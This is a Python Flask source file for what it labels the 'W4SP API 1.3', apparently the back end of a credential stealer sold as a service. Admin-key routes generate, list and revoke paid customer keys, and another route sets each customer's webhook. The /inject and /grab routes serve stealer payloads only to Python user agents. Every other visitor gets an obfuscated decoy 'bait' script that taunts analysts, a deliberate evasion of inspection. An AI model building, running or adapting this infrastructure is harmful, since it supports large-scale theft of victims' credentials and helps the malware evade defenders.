from flask import Flask, request
from random import choice
from etc.keys import Response, Gen, Remove, Edit, Script, Inject, Grab, Webhook
from etc.hype import Obfuscate

app = Flask('Wasp')
admin_key = 'x'

# W4SP API 1.3
# by billythegoat356

bait = """uwu uwu uwu uwu
uwu uwu uwu uwu
uwu uwu uwu uwu, uwu, uwu, uwu
uwu uwu.uwu uwu uwu
uwu uwu
uwu uwu uwu uwu

#  THIS IS A BAIT LMAO
#  YOU REALY DEOBED THIS THINKING IT WAS
#  THE STEALER ??
# 
# 

uwu uwu != 'uwu': 
    uwu()

uwu uwu():
    uwu = uwu([uwu("uwu"), uwu("uwu")])
    uwu = uwu(uwu)
    uwu _ uwu uwu(42069):
        uwu = uwu(uwu)
        uwu = uwu + "\\" + uwu
        uwu uwu uwu(uwu) uwu " " uwu uwu uwu:
            uwu uwu
    uwu uwu("uwu")

uwu uwu():
    uwu = ''.uwu(uwu('uwu') uwu _ uwu uwu(42069))
    uwu = ['.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu']
    uwu uwu + uwu(uwu)


uwu uwu(uwu):
    uwu uwu(uwu, uwu='uwu', uwu='uwu-42069') uwu uwu:
        uwu.uwu(uwu.uwu("uwu42069uwu").uwu().uwu("uwu42069"))

uwu uwu(uwu):
    uwu(uwu"uwu {uwu} {uwu}")

uwu uwu(uwu):
    uwu = 'uwu.uwu'
    uwu = uwu"{uwu} {uwu}"
    uwu42069 = uwu.uwu_uwu_uwu
    uwu42069 = "uwu\\uwu\\uwu\\uwu\\uwu"
    uwu_ = uwu.uwu(uwu42069, uwu42069, 42069, uwu.uwu_uwu)
    uwu.uwu(uwu_, "uwu uwu uwu uwu uwu", 42069, uwu.uwu_uwu, uwu"{uwu} & {uwu}")

uwu = uwu() + '\\' + uwu()
uwu(uwu)
uwu(uwu)
uwu:
    uwu(uwu)
uwu:
    uwu"""


host = '10.0.0.4'
port = 80



@app.route('/')
def main_route():
    return Response


@app.route('/gen', methods=['POST'])
def gen_route():
    headers = request.headers
    if headers.get('key') != admin_key:
        print(headers.get('key'), admin_key)
        print('bad')
        return Response, 401
    return ('', Gen(headers.get('id'), headers.get('username'), headers.get('payment')))


@app.route('/keys', methods=['POST'])
def keys_route():
    headers = request.headers
    if headers.get('key') != admin_key:
        print(headers.get('key'), admin_key)
        print('bad')
        return Response, 401
    with open('keys.json', mode='r', encoding='utf-8') as f:
        return f.read(), 200

@app.route('/rm', methods=['POST'])
def remove_route():
    headers = request.headers
    if headers.get('key') != admin_key:
        print(headers.get('key'), admin_key)
        print('bad')
        return Response, 401
    return ('', Remove(headers.get('user_key')))


@app.route('/edit', methods=['POST'])
def edit_route():
    headers = request.headers
    return Edit(key=headers.get('key'), webhook=headers.get('webhook'))

@app.route('/script/<public_key>')
def script_route(public_key):
    headers = request.headers
    return Script(public_key, headers['User-Agent'])

@app.route('/inject/<public_key>')
def inject_route(public_key):
    headers = request.headers
    if "User-Agent" not in headers or "Python" not in headers['User-Agent']:
        print('BAIT')
        return Obfuscate(bait)
    else:
        return Inject(public_key=public_key, headers=headers)

@app.route('/grab/<public_key>')
def grab_route(public_key):
    headers = request.headers
    if "User-Agent" not in headers or "Python" not in headers['User-Agent']:
        print('BAIT')
        return Obfuscate(bait)
    else:
        return Grab(public_key=public_key, headers=headers)


app.run(host, port)
